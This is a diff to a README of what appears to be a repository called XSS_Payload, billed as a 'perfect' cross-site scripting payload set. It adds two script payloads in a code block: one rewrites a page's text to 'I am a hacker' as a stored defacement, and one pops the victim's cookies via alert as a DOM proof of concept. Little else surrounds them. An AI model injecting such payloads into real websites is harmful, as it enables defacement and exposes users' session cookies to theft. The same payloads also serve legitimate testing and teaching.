@@ -1,9 +1,10 @@
 # XSS_Payload
 perfect xss payload stored and reflected and dom and some change in the page
 
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dc249353b0a6e10635deb6d3414b5d6095886795bf022e14e049b20255207d8b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f7061796c6f6164626f782f7873732d7061796c6f61642d6c6973743f7374796c653d736f6369616c"><img src="https://camo.githubusercontent.com/dc249353b0a6e10635deb6d3414b5d6095886795bf022e14e049b20255207d8b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f7061796c6f6164626f782f7873732d7061796c6f61642d6c6973743f7374796c653d736f6369616c" data-canonical-src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social" style="max-width: 100%;"></a>
 
-     <img src="https://camo.githubusercontent.com/8693bde04030b1670d5097703441005eba34240c32d1df1eb82a5f0d6716518e/68747470733a2f2f63646e2e7261776769742e636f6d2f73696e647265736f726875732f617765736f6d652f643733303566333864323966656437386661383536353265336136336531353464643865383832392f6d656469612f62616467652e737667" data-canonical-src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" style="max-width: 100%;">
-# this payload change the main web page 
-<script>
-  document.body.innerHTML = document.body.innerHTML.replace("XSS Playground", "I am a hacker");
-</script>
+# Payloads
+<code>
+<script>document.body.innerHTML = document.body.innerHTML.replace("XSS Playground", "I am a hacker");</script> to change the main web page text  (STORED
+<script>alert(document.cookie);</script> to show your cookie (DOM)
+</code>
